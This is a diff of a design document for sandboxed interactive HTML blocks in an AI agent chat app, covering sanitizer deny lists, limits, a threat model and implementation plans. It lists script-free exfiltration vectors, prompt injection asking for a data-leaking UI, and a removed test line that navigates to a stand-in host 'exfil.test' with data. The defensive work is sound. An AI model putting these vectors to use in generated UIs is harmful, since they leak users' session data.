-| `html` elements | `script`, `meta`, `link`, `base`, `iframe`, `frame`, `frameset`, `object`, `embed`, `portal`, `form`, `noscript`, `template`, `slot`; SVG `set`; SVG `animate*` whose `attributeName` is `href`, `xlink:href` or `src` | removed |
-| `html` attributes | `on*`, `ping`, `attributionsrc`, `autofocus`, `formaction`, `action`, `shadowrootmode`, `name` on `img` | removed |
-| `html` links | `href` on `a`/`area` that is not `https:` or `#…` | `https:` hrefs moved to `data-octi-href`, element gets `role="link"`, `tabindex="0"`; activation (click, Enter, Space) → `link` message, `preventDefault` first. No live `href` remains, so no preconnect, middle-click, context-menu open or drag-out |
-| other URL attributes | `href`/`xlink:href` other than `#…` on SVG `use`; any SVG `a` href; MathML `href`; `src`/`srcset`/`poster`/`background` not `data:`/`blob:` | removed |
-| `html` inputs | `type=password`, `type=file`, `autocomplete` containing `password` | replaced by a notice |
-| `css` | `@import`; `url(`/`image-set(` other than `#…` or `data:`; `text-security` | left to CSP (blocked); `text-security` stripped by rewriting the declaration |
-| render cost | more than 200 `<use>` elements, `<use>` nesting deeper than 3, more than 20 `filter`/`backdrop-filter` uses | removed beyond the cap |
-| `js` | syntax errors (esbuild `transform`, server only) | n/a |
-| any field | `{{secret:` | n/a |
-
-The runtime walks with `composedPath()` for link activation and never uses
-`setHTMLUnsafe`/`parseHTMLUnsafe` (declarative shadow roots would escape the
-walk).
+| elements | `script`, `meta`, `link`, `base`, `iframe`, `frame`, `frameset`, `object`, `embed`, `portal`, `form`, `noscript`, `template`, `slot`, SVG `set`; `animate*` of `href`/`xlink:href`/`src` | removed with content |
+| attributes | `on*`, `ping`, `attributionsrc`, `autofocus`, `formaction`, `action`, `shadowrootmode`, `shadowroot`, `srcdoc`, `srcset`, `imagesrcset`, `name` on `img` | removed |
+| links | `href` on `a`/`area` | `https:` → `data-octi-href`, `#…` → `data-octi-anchor`, with `role="link"` and `tabindex="0"`; anything else removed. Activation (click, middle click, Enter, Space) → `link` message or scroll; drag prevented |
+| other URLs | SVG `href`/`xlink:href` other than `#…`; any SVG `a` href; `src`/`poster`/`background`/`data`/`lowsrc` not `data:`/`blob:` | removed |
+| inputs | `type=password`, `type=file`, `autocomplete` containing `password` | replaced by a notice |
+| CSS | `@import`, remote `url(`/`image-set(` (lint; CSP blocks); `text-security` | `text-security` declarations removed |
+| render cost | more than 200 `<use>`, more than 20 `<filter>` | removed beyond the cap |
+| JS | syntax errors (esbuild `transform`, server) | n/a — fatal, repair round |
 
 ### 4.4 Limits (S9)
 
-Constants in `src/shared/inline-ui/limits.ts` (not admin config: the client
-enforces them too).
+Constants in `src/shared/inline-ui/limits.ts`; the browser enforces them too.
 
-| What | Limit | Reason |
-|---|---|---|
-| `title` | ≤ 80 chars, single line, no controls | header |
-| `html` / `css` / `js` | ≤ 24 000 / 6 000 / 12 000 chars | — |
-| total | ≤ 36 000 chars, and `JSON.stringify({css,html,js}).length ≤ 48 000` | ≈ 10 k output tokens; a `get` result stays under the 50 000-char tool-result cap |
-| renders per turn | 4 | counted by `(session_id, run_id)` |
-| blocks per session | 200 | storage |
-| height | 40 px … min(2 000 px, 80 vh) | S12 |
-| `height` messages | one per animation frame | — |
-| `error` messages | 20 per mount | — |
-| `prompt` / `link` | 1 per 500 ms per frame; `prompt` text ≤ 1 000 chars | S6 |
-| invalid messages | > 20 per second → unmount | S5 |
-| `inlineUiReports` per send | ≤ 20 | — |
+| What | Limit |
+|---|---|
+| title | ≤ 80 chars, one line |
+| markup / CSS / JS | ≤ 24 000 / 6 000 / 12 000 chars; total ≤ 36 000 |
+| blocks | 4 per reply, 200 per session |
+| height | 40 px … min(2 000 px, 80 % of the viewport) |
+| `error` messages | 20 per mount |
+| `prompt` / `link` | 1 per 500 ms per frame; prompt text ≤ 1 000 chars |
+| invalid messages | > 20 per second → unmount |
+| reports per message | ≤ 20 |
+| live frames | 6 (3 below 640 px) |
+| strip/chip input delay | 800 ms |
 
 ### 4.5 Threat model
 
 | # | Threat | Outcome |
 |---|---|---|
-| T1 | Injected content asks for a UI that sends session data out | No session access (S1); no fetch (S2); navigation blocked by the host (spike) or ASK as write egress plus click-to-run (fallback) (D9) |
-| T2 | Vault secret placed in markup | Refused (S11) |
+| T1 | Injected content asks for a UI that sends session data out | No session access (S1); no fetch (S2); navigation blocked (Chromium) or click-to-run (elsewhere); click-to-run when tainted (D10) |
+| T2 | Vault secret in markup | Not resolvable in a reply (S11) |
 | T3 | Parser breakout | Impossible: content is data (D6) |
-| T4 | Exfiltration without script (meta refresh, prefetch, preconnect, CSS, SMIL href) | Pragmas stripped, no live hrefs, SMIL href refused, CSP blocks CSS URLs |
-| T5 | Fake login or fake app UI | S12; click-to-run when tainted (D10) |
-| T6 | Tab hang or memory bomb (opaque-origin frames may share the chat page's process in Firefox, WebKit and WebView2) | History blocks click-to-run; render-cost caps; freeze marker (§5.6); flood unmount |
+| T4 | Exfiltration without script (meta refresh, prefetch, CSS, SMIL href) | Refused elements, no live hrefs, SMIL href refused, CSP blocks CSS URLs, DNS prefetch off |
+| T5 | Fake login or fake app UI | S12; click-to-run when tainted |
+| T6 | Tab hang or memory bomb | History blocks wait for a click; render-cost caps; freeze marker; flood unmount; live-frame cap |
 | T7 | Steering the user's next message | Strip outside the frame, full text, explicit Send, input delay, height lock (S6) |
-| T8 | Cross-session or cross-user read | S8; `get` limited to the session |
-| T9 | Admin impersonation runs the target's code | Click-to-run and bridge disabled (D10) |
+| T8 | Cross-session or cross-user read | S8; `inline-ui__source` limited to the agent's session |
+| T9 | Admin impersonation runs the target's code | Click-to-run; suggestions and saving disabled |
 | T10 | Desktop IPC | S13 |
-| T11 | Preview leaks before validation or approval | §8: static content frame; forwarded only for offered handlers and while the label has no `secret`, re-checked on every emit |
-| T12 | Promotion opens network access to viewers | D15 strict network policy; tainted blocks refused |
-| T13 | Generated text reaches the model as the user's words | Client reports are structured (outcome enum, error class, line); no free text from generated code reaches the model; ids only, never titles, in model-facing notes |
+| T11 | Preview leaks before validation | The preview is static (no JS), sanitized by the same runtime, and built from text the user is already shown streaming |
+| T12 | Promotion opens network access to viewers | `network = 'none'`; tainted blocks refused; private or workspace only (§7) |
+| T13 | Generated text reaches the model as the user's words | Client reports are enums, an error class and a line number; ids, never titles, in model-facing notes |
 | T14 | Focus theft | S14 |
-| T15 | Pastejacking via `execCommand('copy')` | `clipboard-write 'none'`; tested per engine; documented if an engine still allows it |
+| T15 | A room member's question shapes code everyone runs | Shared conversations wait for a click (D10); suggestions post as the clicking member's own addressed message |
 
 ---
 
-## 5. P1 — Spike, tool, storage, frames, history, evaluation
+## 5. P1 — Format, storage, frames, history, evaluation
 
-### 5.0 Spike (first, before the rest of P1)
+### 5.0 Spike
 
-A throwaway Playwright test page with the two-frame structure, on Chromium,
-Firefox and WebKit (and a manual run in the three desktop webviews):
-
-1. Content frame does `location = 'https://exfil.test/?d=1'` (routed and
-   fulfilled with 200, with 204, and with a slow never-finishing body).
-   Expect: no request reaches the route; a `securitypolicyviolation` reaches
-   the host.
-2. Same via a user click on a link the runtime did not strip (test-only).
-3. Does `frame-src 'none'` permit the `srcdoc` content frame, or is `blob:`
-   needed?
-4. `navigator.userActivation`, `document.featurePolicy`, and
-   `execCommand('copy')` behaviour per engine.
-5. Inheritance: inside the content frame, the nonce-C runtime runs and
-   `data:` image, `data:` font and `blob:` image load with no violation
-   (§4.2 inheritance rule); compare `srcdoc`, `blob:` and `data:` content
-   frames.
-6. Which realm gets the navigation violation. By CSP3 the initiator's
-   policy is checked, and the content document carries the inherited host
-   `frame-src` too, so the event may fire only in the content realm, where
-   generated code lives. Record per engine whether the **host** observes a
-   violation or a content `load` (Chromium commits an error page).
-
-The result picks D9's branch and the host `frame-src` value and is recorded
-in the P1 PR. If WebKit alone fails, the fallback branch applies everywhere
-(one behaviour, not per-engine).
+`tests/web/inline-ui-frames.spec.ts` builds the real host document in a blank
+page and records every request to a `.test` host. Results on Chromium: the
+runtime runs under the inherited host CSP and `data:` images load; a
+scripted content frame's `location =` to a routed URL answered 200 or 204
+sends no request; the host reports `stopped` with reason `navigation`; the
+content cannot forge host signals; floods unmount; the refused-markup and
+clobbering cases leave the runtime intact. Firefox and WebKit could not be
+run in the build environment; D9 applies click-to-run to them.
 
 ### 5.1 Table `inline_ui_blocks`
 
-Schema `src/db/schema/inline-ui-blocks.ts`, exported from
-`src/db/schema/index.ts`. Hand-written migration
-`src/db/migrations/0138_inline_ui_blocks.sql` plus a journal entry (as
-`0137`). Additive; no down-migration (repository convention).
+Schema `src/db/schema/inline-ui-blocks.ts`; migration
+`src/db/migrations/0139_inline_ui_blocks.sql` plus its journal entry.
 
 | Column | Type | Notes |
 |---|---|---|
-| `id` | uuid pk default random | |
-| `session_id` | uuid not null → `sessions.id` on delete cascade | |
-| `run_id` | text not null | per-turn cap, log correlation |
-| `agent_id` | text not null | |
-| `tool_call_id` | text not null | |
-| `title` | text not null | |
-| `height_hint` | integer not null default 320 | |
-| `css` / `html` / `js` | text not null default `''` | |
-| `scripts` | boolean not null | `js.trim() !== ''`, set by the server |
-| `tainted` | boolean not null | label had `suspicious`, `private` or `secret` at render time |
-| `created_at` | timestamptz default now | |
+| `id` | uuid pk | |
+| `session_id` | uuid → `sessions.id` on delete cascade | |
+| `run_id` | text | the turn (`runId`), for logs |
+| `agent_id` | text | |
+| `requester_id` | uuid → `users.id` on delete set null | who asked (room requester or chat owner) |
+| `title` | text | |
+| `height_hint` | integer default 320 | |
+| `css` / `html` / `js` | text | |
+| `scripts` | boolean | JS present |
+| `tainted` | boolean | flow label had any flag |
+| `risk` | text `normal` / `high` | `secret`, or `private` with `suspicious` |
+| `issues` | jsonb | repairable issue codes that the runtime will remove |
+| `created_at` | timestamptz | |
 
-Indexes `(session_id, created_at)`, `(session_id, run_id)`. Repository
-`src/db/repositories/inline-ui-repository.ts`: `create`, `countForRun`,
-`countForSession`, `getInSession(id, sessionId)`,
-`listForSession(sessionId, since?)` — `since` is the session's `clearedAt`, so
-blocks from before a `/clear` are not listed.
+Repository `src/db/repositories/inline-ui-repository.ts`: `create`,
+`countForSession`, `getInSession`, `getManyInSession`, `listForSession`.
 
-### 5.2 Tool `src/tools/inline-ui/index.ts`
+### 5.2 Extraction (`src/core/inline-ui/extract.ts`)
 
-Pattern `src/tools/visual/index.ts`; registered in `MODULES`. Manifest
-permissions `render` ALLOW, `read` ALLOW.
+`storeInlineUiBlocks(text, { sessionId, agentId, requesterId,
+contentStorageOff })`: for each fence — lint and syntax check, per-reply and
+per-session caps, `contentStorageOff` (a remote-space session) refuses —
+store and replace with a marker, or replace with a notice. Logs
+`Interactive answer stored` (info: block id, mode, sizes, `tainted`, `risk`,
+issues) or `Interactive answer refused` (warn: codes), with the turn's
+`runId`. `stubInlineUiFences` replaces fences with the fallback line for
+history copies. `inlineUiRepairMessage` builds the repair request (D12).
 
-| Handler | Options |
-|---|---|
-| `render` | `{ permissionAction: 'render', injectSecrets: false, excludeFromCodemode: true }` |
-| `get` | `{ permissionAction: 'read', readOnly: true, injectSecrets: false }` |
-| `guide` | `{ permissionAction: 'read', readOnly: true, injectSecrets: false }` |
+The worker's other text passes see only prose: text tool-call recovery and
+the toolshim run on `withoutInlineUiFences`, and the loop and thinking
+strippers run through `transformOutsideInlineUiFences`, so markup that
+repeats by nature (table rows) is not mangled.
 
-`excludeFromCodemode` is a new optional field on `ToolHandler`
-(`src/core/agent-base.ts:73-107`), copied in `registerTool`
-(`base-tool.ts:78-101`); `scriptableTools` checks it (`codemode.ts:84-92`).
-`streamInput` is added in P4, not here.
+### 5.3 Tool `src/tools/inline-ui/index.ts`
 
-**`render` steps**
-1. `context.root && context.metadata?.inlineUiOffered` and no stored DENY, or
-   `ToolNotExecutedError`.
-2. Lint (§4.3), limits (§4.4), esbuild syntax check — each failure a
-   `ToolNotExecutedError` naming rule, field and limit.
-3. Truncation: missing or empty `html` → "html is missing — the call was
-   probably cut off by the output limit; make the UI smaller (target under
-   12 KB)". `html` ending inside a tag, or `js` failing to parse at its end,
-   get the same advice.
-4. Per-turn and per-session caps.
-5. Insert the row (`tainted` from `getFlowLabel(sessionId)`).
-6. Log `info` with `runId`, `blockId`, sizes, mode; on failure the refusal code.
-7. Return
+`inline-ui__source` — action `read`, read-only, `injectSecrets: false`;
+registered in `MODULES`. Requires `context.root` and
+`metadata.inlineUiOffered`; `{ id }` → `{ id, title, height, body }` where
+`body` is the block rebuilt as `<style>`, markup, `<script>`, if the block
+belongs to the agent's session, else "No interactive answer … in this
+conversation". Manifest permissions `render` ALLOW (the kill switch is a
+stored DENY on it) and `read` ALLOW.
 
-```json
-{ "rendered": true, "id": "<uuid>", "mode": "scripted",
-  "note": "Shown inline in the user's web chat. Don't repeat it as text; add at most one sentence. To change it later, call inline-ui__get with this id and render a new version.",
-  "__workStream": { "inlineUi": { "id": "<uuid>", "title": "…", "heightHint": 320, "scripts": true, "tainted": false } } }
-```
+### 5.4 Offering and the prompt (root-runner)
 
-**`get`** — `{ id }` → `{ id, title, css, html, js, createdAt }` if the block
-belongs to the current session, else `ToolNotExecutedError("not found in this
-session")`.
+`resolveInlineUiOffer` reads the session audience, the CLI-provider check, a
+stored-DENY check on `inline-ui`/`render`, and `getRunContext().renders`,
+after `rootIsSmall`. When offered: `INLINE_UI_PROMPT` (≈ 550 tokens: when
+and when not, the format, limits, no network, links and `octi`, quality,
+theme tokens, markers and `inline-ui__source`) joins the static prompt
+parts; `inline-ui` joins the lazy core ids; `inlineUiNotes` (D14, §5.5) join
+the volatile part.
 
-**`guide`** — returns `src/tools/inline-ui/guide.md` (§9.2), md-loader import
-like `src/tools/artifacts-toolbox/design-guide.md`.
+### 5.5 Web (`web/components/chat/inline-ui/`)
 
-### 5.3 Flow guard and approvals
+- `context.tsx` — the page that shows a conversation (chat, room) provides a
+  host: how to fetch a block, whether the conversation is shared, which
+  blocks arrived live, impersonation, and the actions (report, send/edit a
+  suggestion, save as artifact). Fetches are cached per conversation; a
+  failed fetch is not cached (Retry).
+- `content.tsx` — `AssistantContent` splits a reply into markdown and blocks
+  (markers inside code fences stay text); `StreamingContent` and
+  `InlineUiPreview` (§8).
+- `frame.tsx` — the host frame, built once per mount; listens to that frame
+  only; floods unmount.
+- `block.tsx` — chrome (border, header with title, "Interactive answer",
+  "resets when reloaded", View source, Restart, Save as artifact; skip link;
+  footer), click-to-run (D10), the live-frame cap, the freeze marker
+  (`localStorage['octi-ui-mounted:<id>']`, set before mount, cleared on
+  clean unmount and `pagehide`), the focus guard (S14), errors, removed
+  parts, blank, link chip, suggestion strip, height lock, source view.
+- States: loading · ready · waiting for a click (with the reason) · script
+  error (class and line) · stopped (navigation, flood, focus) · froze ·
+  blank · not available (404, Retry).
+- The chat page marks blocks of replies received while open as live, keeps
+  client reports per session and sends them with the next `chat.send`
+  (REST fallback: kept for the next gateway send), declares `renders`, and
+  provides `saveAsArtifact`. Rooms (`room-view.tsx`) provide a shared host;
+  remote rooms fetch through the remote-spaces route.
 
-- `classifyFlow` (`flow-guard.ts:101-169`): `inline-ui` + `render` + non-empty
-  `js` → `{ taints: [] }` if the spike passed, `{ taints: [], egress: 'write' }`
-  otherwise; static → `{ taints: [] }`.
-- `isVaultAuthenticated` (`:505-519`) returns false for `toolId === 'inline-ui'`.
-- At `tool-executor.ts:757-762`, for `toolId === 'inline-ui'` pass
-  `{ title, sizes, mode }` to `requestApproval` instead of the arguments, so
-  neither `permission_requests` nor the event carries 36 KB of source.
-- `docs/FLOW-GUARD.md` updated.
+**Client outcomes reach the model (G3, T13).** `chat.send` carries
+`inlineUi.reports: [{ id, outcome, errorClass?, line? }]` (enums and
+integers, ≤ 20). `resolveInlineUiTurnNotes` keeps reports for blocks of the
+session and turns each into one line,
+`(system note: interactive answer <uuid> reported script-error TypeError line 12)`,
+in the root prompt's volatile part — which the worker stores on the user row,
+so it reaches the model in both history paths. Reports for other sessions'
+blocks are dropped with a warning.
 
-### 5.4 History (D12)
+### 5.6 Other surfaces
 
-Implemented at snapshot write (`agent-worker.ts:797-808`) as a pure function
-`stubInlineUiHistory(messages)` in `src/core/agent/inline-ui-history.ts`, unit
-tested. The final assistant row's `metadata` (`service.ts:1099-1100`) gets the
-`promptContext` note, with block ids found by `getRunId()`.
+`inlineUiFallbackText` (markers and any stray fence → "▸ Interactive answer
+“T” — open this conversation in the Octipus web app to use it.") is applied
+by: channel replies (`summarizeForChannel`), monitor delivery, the group
+bridge relay, hook `notifyOwner`, room notifications, `POST /api/chat`
+without `renders`, the OpenAI-compatible API, and the TUI (final and
+streaming text). Voice (server and web) uses `inlineUiSpeechText`, which
+drops blocks entirely. MCP clients reach replies through `/api/chat` and get
+the line.
 
-### 5.5 Work-stream plumbing
+### 5.7 REST and federation
 
-- `src/shared/work-stream.ts`: `inlineUi?: { id; title; heightHint; scripts; tainted }`
-  on `ToolResultWorkStreamMeta`; union member
-  `{ kind: 'inline_ui'; id; title; heightHint; scripts; tainted }`.
-- `src/core/work-stream/renderers.ts`: `REGISTRY` entry for
-  `inline-ui__render` with title "Showed <title>" and a capped input summary.
-- Web `ToolResultPreviewView`: the case plus `default: return assertNever(result)`.
-- TUI `summarizeResultPreview`: `interactive answer: <title> (open in the web app)`.
+- `GET /api/sessions/:id/inline-ui/:blockId` → the block with `shared`
+  (`src/api/routes/inline-ui.ts`); S8; `no-store`.
+- `POST /api/sessions/:id/inline-ui/:blockId/promote` (§7).
+- Federation host op `room.inline_ui` (`roomAccess`, the room in the named
+  space) and `GET /api/remote-spaces/:id/rooms/:roomId/inline-ui/:blockId`.
 
-### 5.6 Web
+### 5.8 Evaluation harness
 
-**`web/components/chat/inline-ui-block.tsx`**
-- Chat-page chrome (S12): border; header with title (heading), "Interactive
-  answer", "Resets when reloaded" on scripted blocks, actions ("View source"
-  in the read-only code viewer, "Restart", P3 "Save"); a "Skip interactive
-  answer" link before the frame; footer.
-- Host document from `buildHostDocument({ mode, css, html, js, theme })`
-  (`src/shared/inline-ui/host.ts`); theme tokens from
-  `src/shared/inline-ui/theme.ts`, created in P1 from the dark values of
-  `ARTIFACT_BASE_CSS` (`src/core/artifacts/widget-render.ts:189`).
-- Content runtime (`src/shared/inline-ui/content-runtime.ts`): cache
-  primitives; sanitize-and-insert (D6, §4.3); attach js in scripted mode;
-  `ResizeObserver` → `height`; `window.onerror`/`unhandledrejection` →
-  `error { kind: 'script', errorClass, line }`; `ready` after insertion and
-  first `requestAnimationFrame`; link activation → `link`; blank check (no
-  text, SVG or canvas) → `error { kind: 'blank' }`.
-- Host runtime (`src/shared/inline-ui/host-runtime.ts`): create the content
-  frame; relay validated content messages (clamp, rate, cap); emit `stopped
-  { reason: 'navigation' | 'flood' }` from its own observations (content
-  `load` after the first, `securitypolicyviolation` on `frame-src`, message
-  flood). Content-frame messages cannot produce `stopped`.
-- **Bridge messages** (`src/shared/inline-ui/bridge.ts`), host → chat page,
-  P1: `ready`, `height`, `error`, `link`, `stopped`. P2 adds `prompt`. Chat
-  page → host, P4 only: `update`. Generated code sees one frozen global,
-  `octi`: P1 `octi.openLink(url)`, P2 `octi.prompt(text)`.
-- Lifecycle: mount within one viewport of view (IntersectionObserver); at
-  most 6 mounted blocks (3 below 640 px); least recently visible unmounted to
-  a placeholder with "Show".
-- **Freeze marker (T6):** before mounting any block, set
-  `localStorage['octi-ui-mounted:<id>'] = 1`; remove it on clean unmount and
-  on the chat page's `pagehide`. A hung renderer never fires `pagehide`, so a
-  marker found at page load means that block was mounted when the tab died:
-  it shows "Stopped — the page froze while this was open" with Run. Storage
-  access in try/catch with a logged warning (fail loud, no swallow).
-- Click-to-run per D10.
-- States: loading source · ready · waiting for click · script error · stopped
-  (navigation / flood / froze) · blank · unavailable (404 or fetch failed,
-  Retry) · session deleted.
-- Links: a `link` message shows a chip under the frame with the full URL as
-  `<a target="_blank" rel="noopener noreferrer">`; non-`https:` URLs and URLs
-  with credentials are dropped.
-- Focus guard (S14).
+- Tool rows record `toolName`; `POST /api/chat` with `toolsUsed: true`
+  returns the tool names of the turn (`toolNamesSince`).
+- `uses_tool` / `not_uses_tool` cannot be judged in unit mode and fail with
+  the reason (they used to pass on an empty list).
+- YAML `context.renders` is passed to `/api/chat`; a test that declares it is
+  refused in unit mode (`rendersObservabilityBlocker`), where the root
+  prompt is never built.
+- The YAML loader now applies double-quote escapes (§13).
 
-**`web/app/chat/page.tsx`**
-- On `tool_call_complete` with `result.kind === 'inline_ui'` from the root
-  agent of the open session (`TrackedAgent.root`): add an `inline_ui` entry
-  with the clamped envelope timestamp (D3).
-- `loadSessionMessages` also fetches the listing; a 404 from an older server
-  means "no blocks" with one `console.warn`; a malformed body shows
-  "unavailable".
-- Auto-scroll also on new `inline_ui` entries and frame growth, only when the
-  user is within 120 px of the bottom.
-- `chat.send` carries `renders: ['inline_ui']` (D14).
+### 5.9 Evaluation suite
 
-**Client outcomes reach the model (G3, T13).** The page keeps per-block
-outcomes (`script-error`, `blank`, `stopped-navigation`, `stopped-flood`,
-`froze`) with `errorClass` (from a fixed list: `TypeError`, `ReferenceError`,
-`RangeError`, `SyntaxError`, `Error`, `other`) and a line number. The next
-`chat.send` carries `inlineUiReports: [{ id, outcome, errorClass?, line? }]`
-(Zod: enums and integers only, ≤ 20). The composer shows "Report attached for
-1 interactive answer" and lets the user remove it.
+`eval/inline-ui.yaml`: 15 positives (calculators, converters, charts of
+given numbers, mechanism and algorithm step-throughs, comparisons with
+controls), 10 negatives (facts, code, lists, single values, plain tables,
+prose), one case without `renders` (never offered), 5 ambiguous cases
+(reported, not gated). Positives must show a marker with no refusal and no
+raw fence; negatives must show neither.
 
-Server path: `message-handler` → `handleMessage(…, { inlineUi: { renders, reports,
-provenance } })` → root-runner extras → validated (ids must belong to the
-session) → one line pushed into the root prompt's volatile part → stored on
-the user row as `promptContext` (`agent-worker.ts:609-633`), so it reaches the
-model in both the snapshot and the rebuild paths. A steered send writes the
-same line into the user row's metadata at `message-handler.ts:122` and
-prefixes the steer content. Turns that never reach the root agent
-(commands, direct responses, `service.ts:723-807`) drop the reports with a
-`warn` log. Line format:
-`(system note: interactive answer <uuid> reported script-error TypeError line 12)`.
-
-### 5.7 REST
-
-`src/api/routes/inline-ui.ts`:
-- `GET /api/sessions/:id/inline-ui` → `{ blocks: [{ id, toolCallId, agentId, title, heightHint, scripts, tainted, createdAt }] }`
-  since `clearedAt`.
-- `GET /api/sessions/:id/inline-ui/:blockId` → block with source.
-- Both: `scopedRepos(principal).sessions.findById(:id)` then the repository;
-  404 otherwise; `cache-control: no-store`; 404s not cached.
-- `src/api/routes/inline-ui.isolation.test.ts`: two users, a deactivated
-  user, impersonation.
-
-### 5.8 Offering (root-runner)
-
-```ts
-// after rootIsSmall (root-runner.ts:349)
-const inlineUi = await inlineUiOffered({
-  root: true,
-  audience: (await sessionAudience(session)).kind,
-  renders: getRunContext()?.renders,
-  small: rootIsSmall,
-  denied: await isToolDenied(userId, 'inline-ui'),
-});
-rootTools = inlineUi
-  ? [...rootTools.filter(isNotInlineUi), ...inlineUiHandlers()]
-  : rootTools.filter(isNotInlineUi);
-if (inlineUi) rootContext.metadata = { ...rootContext.metadata, inlineUiOffered: true };
-// lazy branch, root-runner.ts:413:  ...(inlineUi ? ['inline-ui'] : []),
-// volatile prompt part, only when offered: one line naming the tool and when to use it
-```
-
-`inlineUiOffered` lives in `src/core/agent/inline-ui-offer.ts`. `isToolDenied`
-(a stored-DENY lookup through `PermissionManager`, `src/security/permissions.ts:132-240`)
-and `rootContext` (the root `AgentContext` root-runner builds) are names for
-this sketch; the implementation uses whatever those are called at the time.
-`prompt.md` and `prompt.lite.md` do not change. A mirror sentence goes into
-the `create_live_artifact` description: "for a one-off visual in this chat,
-use inline-ui if available".
-
-### 5.9 Evaluation harness (P1a; AGENT.md requires routing and tool-selection changes to pass `npm run eval`)
-
-- `tool-executor.ts:1093-1099` sets `toolName` on tool rows, taken from the
-  call by id (`ToolResult` has no name, `src/core/types.ts:157-162`).
-- `POST /api/chat` accepts opt-in `toolsUsed: true` (pattern of `routedRoles`,
-  `chat.ts:169-176`) and returns the tool names of rows created in this turn.
-- The runner sends `toolsUsed: true`. `uses_tool`/`not_uses_tool` are "not
-  evaluable" in unit mode instead of passing or failing trivially; suites
-  that used `not_uses_tool` are re-baselined and the change reported.
-- YAML `context` gains `renders: [inline_ui]`, passed through `/api/chat` to
-  `handleMessage` (eval only). No `channel: webchat`: that would make eval
-  turns attended and every ASK would wait for its timeout.
-
-### 5.10 Evaluation suite and gate
-
-`eval/inline-ui.yaml`, ≥ 30 cases, each 3× on at least two models (one
-local). Mix: clear positives (calculator, converter, mechanism diagram, chart
-of given numbers, scenario comparison); clear negatives (factual question,
-code, short list, single value, plain table); ambiguous (inline vs artifact,
-"chart my open tasks" with real tool data). Reported as use rates per class.
-
-Mechanical quality checks on every rendered block, by a Playwright harness
-that serves stored rows to the real block component (not the stubbed chat
-lane): no `error`/`blank`; no CSP violations; each `input[type=number|range]`
-set to min, max and empty shows no `NaN`/`Infinity`. Human review of 10
-blocks per model.
-
-**Gate before P2:** positives ≥ 70% use, negatives ≤ 10% use, mechanical
-checks ≥ 80% clean, on the hosted model. Below the gate, P1 stays, the
-description and guide are revised, P2–P4 wait. The gate result, the
-lite-tier result and the "guide vs description only" comparison are recorded
-in the P1 PR.
+**Gate:** positives ≥ 70 % use, negatives ≤ 10 % use, each case 3× on at
+least two models (one local). Not yet run (§12).
 
 ---
 
 ## 6. P2 — Suggested follow-ups
 
-- Frame: `octi.prompt(text)` → `prompt` (≤ 1 000 chars).
-- Chat page: S5/S6 checks, then a strip below the frame at a fixed place,
-  frame height locked while it is open: "Suggested by <title>:", the full
-  cleaned text, `[Send] [Edit in composer] [Dismiss]`, buttons inert for
-  800 ms after appearing or moving. One strip per block.
-  - **Send** calls `sendMessage` with `provenance: { inlineUiId }`; during a
-    running turn it reads "Send as guidance" (it steers, §1.3).
-  - **Edit in composer** calls a new `PromptInput` handle `insertDraft(text,
-    source)` (ref + `useImperativeHandle`); it appends on a new line and shows
-    a removable "from <title>" chip.
-- Provenance: `chat.send` gains `provenance?: { inlineUiId }`; same server
-  path as reports (§5.6), id checked against the session. Both the normal
-  path (`agent-worker.ts:625`) and the steer path (`message-handler.ts:122`,
-  `trySteerRunningRootAgent` gains `{ reports, provenance }`) store
-  `metadata: { promptContext, inlineUiProvenance: { id } }`, and the steer
-  `chat.message` event (`message-handler.ts:304-310`) carries
-  `inlineUiProvenance`. The model-facing line is
-  `(system note: the user sent this from interactive answer <uuid>)`. The
-  visible bubble's "from <title>" chip reads `inlineUiProvenance`; the text is
-  unchanged.
+- Frame: `octi.prompt(text)` → `prompt` (≤ 1 000 chars, cleaned).
+- Chat page: a strip below the frame at a fixed place, the frame's height
+  locked while it is open: the full text, **Send** ("Send as guidance" while
+  a turn runs — it steers), **Edit in composer**, **Dismiss**; buttons inert
+  for 800 ms after appearing. One strip per block.
+  - **Send** sends the text as the user's message with
+    `inlineUi.provenance: { inlineUiId }`; in a room it posts the member's
+    own message addressed to the agent.
+  - **Edit in composer** calls `PromptInput`'s `insertDraft(text, source)`;
+    it appends to the draft and shows a removable "from interactive answer
+    “T”" chip; the provenance travels with the send.
+- Provenance: checked against the session; the model-facing line is
+  `(system note: the user sent this from interactive answer <uuid>)`; the
+  user row stores `metadata.inlineUiProvenance`, on the steer path too
+  (`trySteerRunningRootAgent`); the bubble shows "from an interactive
+  answer".
 - Disabled while impersonating.
 
 ---
 
 ## 7. P3 — Save as live artifact
 
-Prerequisites, each its own PR:
-1. Fix §13-1 (embed CSP `sandbox` directive).
-2. Refactor: move `writeVersion` to `src/core/artifacts/version-writer.ts`;
-   `SLUG_RE` (duplicated at `src/api/routes/artifacts.ts:22` and
-   `src/tools/artifacts/index.ts:24`) to `src/shared/artifacts.ts`; make
-   `ARTIFACT_BASE_CSS` import the tokens from `src/shared/inline-ui/theme.ts`.
-3. Artifact `network` column (`'default' | 'none'`) and `buildEmbedCsp`
-   support (D15).
+Prerequisites (done): the embed CSP header carries `sandbox allow-scripts`
+(§13-1); `writeVersion` in core (D15); `ARTIFACT_SLUG_RE` and
+`slugFromTitle` in `src/shared/artifacts.ts`; `ARTIFACT_BASE_CSS` built from
+the shared theme tokens (byte-identical); artifact `network` column
+(`'default' | 'none'`, migration `0140_artifact_network.sql`) and
+`buildEmbedCsp({ network })`.
 
-Feature:
-- "Save as artifact" on a block; disabled with a reason when there is no
-  workspace or the block is `tainted`.
-- Dialog: title, slug, visibility `private` (default) or `workspace`. It says
-  "a static copy — no data refresh". If the source uses `octi.*`, it warns
-  that those buttons will show "not available here".
-- `POST /api/sessions/:id/inline-ui/:blockId/promote` → scoped session check
-  → workspace from `artifactStore(principal)` (`src/api/routes/artifacts.ts:71`)
-  → template = sanitized html serialized by the same rules, css, and js passed
-  to `writeVersion` as script content through the bundler path (no string
-  concatenation of `<script>`) with an `octi` shim whose methods reject with
-  a visible message → artifact created with `network = 'none'`.
-- A user action under the user's own session; no agent ASK.
+**Web.** "Save as artifact" in the block header; disabled with the reason
+for a `tainted` block or while impersonating; the chat page only (not
+rooms). The dialog: title, slug (suggested from the title, validated),
+visibility `private` (default) or `workspace`; it says "a static copy — no
+data refresh, and it reaches no network", and when the script uses `octi`
+(`usesOctiBridge`) that those buttons will say "not available here". On
+success: a link to the artifact and any build warning.
+
+**Server** — `POST /api/sessions/:id/inline-ui/:blockId/promote`:
+1. authenticated; refused while impersonating (403);
+2. the caller's own chat: `contentRepos(principal).sessions.findById` and
+   `session.userId === principal.userId` (an admin who may read the chat
+   cannot save from it; rooms are not chats) → else 404;
+3. the block in that session → else 404; `tainted` → 409;
